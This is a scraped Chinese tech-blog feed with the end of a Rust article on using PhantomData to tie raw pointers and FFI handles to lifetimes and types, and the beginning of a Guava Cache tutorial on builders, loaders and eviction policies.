<p>于是类型系统就会把 <code>Slice&lt;'a, T&gt;</code> 当成“借用了 <code>'a</code> 的 <code>T</code>”，从而强制它不能活过 <code>'a</code>。</p>
<hr/>
<h3 data-id="heading-2">坏例子：没有生命周期绑定，能编译，但可能产生悬垂指针（UB）</h3>
<p>下面这段代码演示了“裸指针 + 没有 <code>'a</code>”的危险：它能把指向局部 <code>Vec</code> 的指针带出函数。</p>
<blockquote>
<p>注意：这段代码<strong>可能触发未定义行为（UB）</strong> ，请不要在真实项目里这么写。</p>
</blockquote>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SliceIterBad</span>&lt;T&gt; {
    ptr: *<span class="hljs-keyword">const</span> T,
    len: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">raw_from_vec_bad</span>&lt;T&gt;(v: &amp;<span class="hljs-type">Vec</span>&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> SliceIterBad&lt;T&gt; {
    SliceIterBad {
        ptr: v.<span class="hljs-title function_ invoke__">as_ptr</span>(),
        len: v.<span class="hljs-title function_ invoke__">len</span>(),
    }
}

<span class="hljs-comment">// ❌ 能编译，但返回的 ptr 指向已释放的内存</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">bad</span>() <span class="hljs-punctuation">-&gt;</span> SliceIterBad&lt;<span class="hljs-type">i32</span>&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
    <span class="hljs-title function_ invoke__">raw_from_vec_bad</span>(&amp;v) <span class="hljs-comment">// v 在这里被 drop，但指针被带出去了</span>
}
</code></pre>
<p>这就是典型的“类型系统没被告知借用关系 → 编译器无法阻止悬垂”。</p>
<hr/>
<h3 data-id="heading-3">好例子：用 <code>PhantomData&lt;&amp;'a T&gt;</code> 绑定借用，错误在编译期暴露</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::marker::PhantomData;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SliceIter</span>&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    ptr: *<span class="hljs-keyword">const</span> T,
    len: <span class="hljs-type">usize</span>,
    _marker: PhantomData&lt;&amp;<span class="hljs-symbol">'a</span> T&gt;,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">raw_from_vec</span>&lt;<span class="hljs-symbol">'a</span>, T&gt;(v: &amp;<span class="hljs-symbol">'a</span> <span class="hljs-type">Vec</span>&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> SliceIter&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    SliceIter {
        ptr: v.<span class="hljs-title function_ invoke__">as_ptr</span>(),
        len: v.<span class="hljs-title function_ invoke__">len</span>(),
        _marker: PhantomData,
    }
}

<span class="hljs-comment">// ❌ 这次会直接编译失败：你试图返回一个借用了局部变量 v 的值</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">good_but_wont_compile</span>() <span class="hljs-punctuation">-&gt;</span> SliceIter&lt;<span class="hljs-symbol">'static</span>, <span class="hljs-type">i32</span>&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
    <span class="hljs-title function_ invoke__">raw_from_vec</span>(&amp;v)
}
</code></pre>
<p>你会得到类似这样的错误（不同版本文案略有差异）：</p>
<pre><code class="hljs language-sql" lang="sql">error[E0515]: cannot <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">referencing</span> <span class="hljs-keyword">local</span> variable `v`
  <span class="hljs-keyword">returns</span> a <span class="hljs-keyword">value</span> <span class="hljs-keyword">referencing</span> data owned <span class="hljs-keyword">by</span> the <span class="hljs-keyword">current</span> <span class="hljs-keyword">function</span>
</code></pre>
<p>这就达到了目的：<strong>把潜在的悬垂指针风险提前变成编译错误</strong>。</p>
<p>正确使用方式是：让迭代器不超过数据的作用域，例如：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">ok_usage</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">it</span> = <span class="hljs-title function_ invoke__">raw_from_vec</span>(&amp;v);
    <span class="hljs-comment">// 在 v 的生命周期内使用 it</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">_</span> = it.len;
}
</code></pre>
<hr/>
<h2 data-id="heading-4">2. 绑定类型参数：FFI 句柄是 <code>*mut ()</code>，用 <code>PhantomData&lt;R&gt;</code> 防止把 A 当 B 用</h2>
<p>另一类常见场景来自 FFI：外部库可能用统一的 <code>void*</code>（Rust 里常见 <code>*mut ()</code> 或 <code>*mut c_void</code>）当作“资源句柄”。运行时只有一个指针，但它背后可能对应不同资源类型。</p>
<p>如果你只写成“无类型句柄包装”，编译器分不清“这是 Foo 资源还是 Bar 资源”，于是非常容易混用。</p>
<h3 data-id="heading-5">坏例子：句柄不带类型信息，混用能编译，运行时才爆炸</h3>
<p>下面用 <code>assert!</code> 模拟“用错句柄就炸”（真实 FFI 里可能是崩溃/数据错乱/UB）：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ffi::c_void;

<span class="hljs-keyword">mod</span> foreign_lib {
    <span class="hljs-keyword">use</span> super::c_void;

    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Raw</span> {
        tag: <span class="hljs-type">u32</span>, <span class="hljs-comment">// 1 =&gt; Foo, 2 =&gt; Bar</span>
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(tag: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> c_void {
        <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(<span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(Raw { tag })) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> c_void
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_foo</span>(handle: *<span class="hljs-keyword">mut</span> c_void) {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw</span> = handle <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> Raw;
        <span class="hljs-built_in">assert!</span>((*raw).tag == <span class="hljs-number">1</span>, <span class="hljs-string">"expected Foo handle, got tag={}"</span>, (*raw).tag);
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_bar</span>(handle: *<span class="hljs-keyword">mut</span> c_void) {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw</span> = handle <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> Raw;
        <span class="hljs-built_in">assert!</span>((*raw).tag == <span class="hljs-number">2</span>, <span class="hljs-string">"expected Bar handle, got tag={}"</span>, (*raw).tag);
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">free</span>(handle: *<span class="hljs-keyword">mut</span> c_void) {
        <span class="hljs-title function_ invoke__">drop</span>(<span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(handle <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> Raw));
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ExternalResourceBad</span> {
    handle: *<span class="hljs-keyword">mut</span> c_void,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ExternalResourceBad</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new_foo</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> { handle: <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>) } }
    }
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new_bar</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> { handle: <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">2</span>) } }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_foo</span>(&amp;<span class="hljs-keyword">self</span>) { <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">do_foo</span>(<span class="hljs-keyword">self</span>.handle) } }
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_bar</span>(&amp;<span class="hljs-keyword">self</span>) { <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">do_bar</span>(<span class="hljs-keyword">self</span>.handle) } }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Drop</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ExternalResourceBad</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">drop</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">free</span>(<span class="hljs-keyword">self</span>.handle) }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = ExternalResourceBad::<span class="hljs-title function_ invoke__">new_bar</span>();

    <span class="hljs-comment">// ❌ 逻辑错误：拿 Bar 的句柄去当 Foo 用</span>
    <span class="hljs-comment">// 编译器看不出来（类型都一样），但运行时可能 panic/崩溃</span>
    r.<span class="hljs-title function_ invoke__">do_foo</span>();
}
</code></pre>
<h3 data-id="heading-6">好例子：用 <code>PhantomData&lt;R&gt;</code> 把句柄“绑定到类型”，混用直接编译错误</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::{ffi::c_void, marker::PhantomData};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Foo</span>;
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Bar</span>;

<span class="hljs-keyword">trait</span> <span class="hljs-title class_">ResType</span> { <span class="hljs-keyword">const</span> TAG: <span class="hljs-type">u32</span>; }
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ResType</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Foo</span> { <span class="hljs-keyword">const</span> TAG: <span class="hljs-type">u32</span> = <span class="hljs-number">1</span>; }
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ResType</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Bar</span> { <span class="hljs-keyword">const</span> TAG: <span class="hljs-type">u32</span> = <span class="hljs-number">2</span>; }

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ExternalResource</span>&lt;R&gt; {
    handle: *<span class="hljs-keyword">mut</span> c_void,
    _<span class="hljs-keyword">type</span>: PhantomData&lt;R&gt;,
}

<span class="hljs-keyword">impl</span>&lt;R: ResType&gt; ExternalResource&lt;R&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> {
            handle: <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">new</span>(R::TAG) },
            _<span class="hljs-keyword">type</span>: PhantomData,
        }
    }
}

<span class="hljs-keyword">impl</span>&lt;R&gt; <span class="hljs-built_in">Drop</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ExternalResource</span>&lt;R&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">drop</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">free</span>(<span class="hljs-keyword">self</span>.handle) }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">takes_foo</span>(_: ExternalResource&lt;Foo&gt;) {}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">foo</span> = ExternalResource::&lt;Foo&gt;::<span class="hljs-title function_ invoke__">new</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bar</span> = ExternalResource::&lt;Bar&gt;::<span class="hljs-title function_ invoke__">new</span>();

    <span class="hljs-title function_ invoke__">takes_foo</span>(foo); <span class="hljs-comment">// ✅ OK</span>

    <span class="hljs-comment">// takes_foo(bar);</span>
    <span class="hljs-comment">// ❌ 编译期报错：</span>
    <span class="hljs-comment">// expected `ExternalResource&lt;Foo&gt;`, found `ExternalResource&lt;Bar&gt;`</span>
}
</code></pre>
<p>这就是文档里“未使用类型参数”的核心意义：哪怕结构体里<strong>根本没有存 <code>R</code></strong>，你仍然可以用 <code>PhantomData&lt;R&gt;</code> 让类型系统记住并区分它，从而把很多“本来只能靠人肉保证的约定”变成<strong>编译器可检查的约束</strong>。
from Pomelo_刘金，转载请注明原文链接。感谢！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析 Guava Cache- 从基本用法、回收策略、刷新策略到实现原理]]></title>    <link>https://juejin.cn/post/7592017365146075176</link>    <guid>https://juejin.cn/post/7592017365146075176</guid>    <pubDate>2026-01-06T06:44:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592017365146075176" data-draft-id="7592017365146042408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析 Guava Cache- 从基本用法、回收策略、刷新策略到实现原理"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T06:44:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析 Guava Cache- 从基本用法、回收策略、刷新策略到实现原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:44:58.000Z" title="Tue Jan 06 2026 06:44:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Guava Cache 是非常强大的本地缓存工具，提供了非常简单 API 供开发者使用。</p>
<p>这篇文章，我们将详细介绍 Guava Cache 的<strong>基本用法</strong>、<strong>回收策略</strong>，<strong>刷新策略</strong>，<strong>实现原理</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1572c65f3de0436f8f1a21328a917bbc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=QbWrfMtgTCTdG%2BcaHjKwEz4AT%2Bg%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-0">1 基本用法</h2>
<h3 data-id="heading-1">1.1 依赖配置</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.google.guava<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>guava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>31.0.1-jre<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">1.1 创建缓存</h3>
<p>Guava Cache 提供了基于 Builder 构建者模式的构造器，用户只需要根据需求设置好各种参数即可使用。</p>
<p><strong>1、手工创建缓存对象</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Test</span>
public void testHandCache() {
      <span class="hljs-comment">// 测试手工测试</span>
      Cache&lt;String, String&gt; cache = CacheBuilder<span class="hljs-selector-class">.newBuilder</span>().
              <span class="hljs-comment">// 最大容量为20（基于容量进行回收）</span>
                      <span class="hljs-built_in">maximumSize</span>(<span class="hljs-number">20</span>)
              <span class="hljs-comment">// 配置写入后多久未更新，缓存会过期</span>
              <span class="hljs-selector-class">.expireAfterWrite</span>(<span class="hljs-number">10</span>, TimeUnit.SECONDS)<span class="hljs-selector-class">.build</span>();
      cache<span class="hljs-selector-class">.put</span>("hello", "value_HELLO");
      <span class="hljs-built_in">assertEquals</span>("value_HELLO", cache.getIfPresent("hello"));
      Thread<span class="hljs-selector-class">.sleep</span>(<span class="hljs-number">10000</span>);
      <span class="hljs-comment">// 过期后重新获取 </span>
      <span class="hljs-built_in">assertNull</span>(cache.getIfPresent("hello"));
}
</code></pre>
<p>我们可以创建一个缓存对象 Cache ，通过 CacheBuilder 构造器，配置相关参数（最大容量 20 个条目、缓存过期时间 10 秒），最后调用构建方法。</p>
<p><strong>2、创建缓存加载器</strong></p>
<p>CacheLoader 可以理解为一个固定的加载器，在创建 Cache 对象时指定，然后简单地重写 <code>V load(K key) throws Exception</code> 方法，就可以达到当检索不存在的时候，会自动的加载数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLoadingCache</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
      CacheLoader&lt;String, String&gt; cacheLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;String, String&gt;() {
          <span class="hljs-comment">//自动写缓存数据的方法</span>
          <span class="hljs-meta">@Override</span>
          <span class="hljs-keyword">public</span> String <span class="hljs-title function_">load</span><span class="hljs-params">(String key)</span> {
              System.out.println(<span class="hljs-string">"加载 key:"</span> + key);
              <span class="hljs-keyword">return</span><span class="hljs-string">"value_"</span> + key.toUpperCase();
          }
          <span class="hljs-meta">@Override</span>
          <span class="hljs-comment">//重新刷新缓存</span>
          <span class="hljs-keyword">public</span> ListenableFuture&lt;String&gt; <span class="hljs-title function_">reload</span><span class="hljs-params">(String key, String oldValue)</span> <span class="hljs-keyword">throws</span> Exception {
              returnsuper.reload(key, oldValue);
          }
      };

      LoadingCache&lt;String, String&gt; cache =
              CacheBuilder.newBuilder()
                      <span class="hljs-comment">// 最大容量为100（基于容量进行回收）</span>
                      .maximumSize(<span class="hljs-number">20</span>)
                      <span class="hljs-comment">// 配置写入后多久未更新，缓存会过期</span>
                      .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
                      <span class="hljs-comment">//配置写入后多久刷新缓存</span>
                      .refreshAfterWrite(<span class="hljs-number">1</span>, TimeUnit.SECONDS).build(cacheLoader);
        assertEquals(<span class="hljs-number">0</span>, cache.size());
        assertEquals(<span class="hljs-string">"value_HELLO"</span>, cache.getUnchecked(<span class="hljs-string">"hello"</span>));
        assertEquals(<span class="hljs-number">1</span>, cache.size());

     <span class="hljs-comment">// 通过 Callable 获取数据</span>
       <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mykey"</span>;
       <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(key, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Callable</span>&lt;String&gt;() {
          <span class="hljs-meta">@Override</span>
           <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
               <span class="hljs-keyword">return</span><span class="hljs-string">"call_"</span> + key;
          }
        });
       System.out.println(<span class="hljs-string">"call value:"</span> + value);
}
</code></pre>
<p>和手工创建缓存对象不同，我们首先创建缓存加载器对象，并重写 load 方法，然后通过缓存构造器创建 LoadingCache 对象 ，该对象支持写入后刷新方法。</p>
<p>同时 LoadingCache 对象支持 Callable 模式，也就是调用 get 方法时，可以传入 Callable 对象。这样可以在使用缓存时，更加灵活。</p>
<h2 data-id="heading-3">2 回收策略</h2>
<p>Guava Cache 提供了三种基本的缓存回收方式：</p>
<ul>
<li>基于容量回收策略</li>
<li>基于时间的回收策略</li>
<li>基于引用回收策略</li>
</ul>
<h3 data-id="heading-4">2.1 基于容量回收策略</h3>
<p>基于容量的回收策略可以分为两种：<strong>基于大小</strong>和<strong>基于权重</strong>。</p>
<p><strong>基于大小</strong>：我们可以使用 <code>maximumSize</code> 方法设置最大缓存项数量，当缓存项数量达到设定的最大值时，旧的缓存项将会被移除。</p>
<pre><code class="hljs language-ini" lang="ini">Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
    .maximumSize(100)
    .build()<span class="hljs-comment">;</span>
</code></pre>
<p><strong>基于权重</strong>：如果不同的缓存值，需要占据不同的内存空间，也就是不同的缓存项有不同的“权重”（weights）。</p>
<p>我们可以使用 <code>CacheBuilder.weigher(Weigher)</code> 指定一个权重函数，并且用 <code>maximumWeight(long)</code> 指定最大总重。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">Cache</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; cache = <span class="hljs-title class_">CacheBuilder</span>.<span class="hljs-title function_">newBuilder</span>()
    .<span class="hljs-title function_">maximumWeight</span>(<span class="hljs-number">1000</span>)
    .<span class="hljs-title function_">weigher</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Weigher</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt;() {
        <span class="hljs-keyword">public</span> int <span class="hljs-title function_">weigh</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
            <span class="hljs-comment">// 定义权重计算方法</span>
            <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">size</span>();
        }
    }).<span class="hljs-title function_">build</span>();
</code></pre>
<h3 data-id="heading-5">2.2 基于时间的回收策略</h3>
<p>我们可以使用 <code>expireAfterAccess</code> 和 <code>expireAfterWrite</code> 方法设置缓存项的最大存活时间。</p>
<ul>
<li><code>expireAfterAccess</code> 表示缓存项在给定时间内没有被读/写访问会过期。</li>
<li><code>expireAfterWrite</code> 表示缓存项在被创建或最后一次更新后的指定时间内会过期。</li>
</ul>

